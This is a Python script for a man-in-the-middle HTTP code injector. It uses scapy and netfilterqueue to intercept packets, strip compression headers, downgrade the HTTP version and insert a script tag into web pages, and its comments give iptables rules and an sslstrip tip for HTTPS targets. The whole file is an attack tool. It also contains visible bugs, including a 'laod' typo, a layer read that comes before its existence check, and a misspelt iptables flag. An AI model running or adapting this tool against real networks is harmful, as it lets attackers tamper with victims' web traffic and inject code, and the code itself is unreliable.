#!/usr/bin/python3

import scapy.all as scapy
from netfilterqueue import NetfilterQueue
import re

#if you want to run this attack against https page, then you should downgrade https to http via sslstrip or something
#so you must change response and request with dport and sport to the program that you running's port
#you have to set iptable rules instead of FORWARD chain
#set rules like this:
#                    iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-ort 10000
#                    iptables -I INPUT -j NFQUEUE --queue-num 0
#                    iptables -I OUTPUT -j NFQUEUE --queue-num 0

def processing_code_injector(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    load = scapy_packet[scapy.Raw].load.decode('latin1')
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:
            print("[+] Http Request...")
            load = re.sub("Accept-Encoding:.*?\\n", "", load)
            load = laod.replace("HTTP/1.1", "HTTP/1.0")

        elif scapy_packet[scapy.TCP].sport == 80:
            print("[+] Http Response...")
            load = load.replace("</body>", script + "</body>")
            content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
            if content_length_search and "text/html" in load:
                content_length = re.search("(?:Content-Length:\s)(\d*)", load)[1]
                new_content_length = int(content_length) + len(script)
                load = load.replace(content_length, str(new_content_length))

        if load != scapy_packet[scapy.Raw].load.decode('latin1'):
            scapy_packet = set_load(scapy_packet, load)
            packet.set_payload(bytes(scapy_packet))

    packet.accept()

def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

script = "<script>alert('Poda');</script>"

try:
    queue = NetfilterQueue()
    queue.bind(0, processing_code_injector)
    queue.run()
except KeyboardInterrupt:
    print("Quitting program")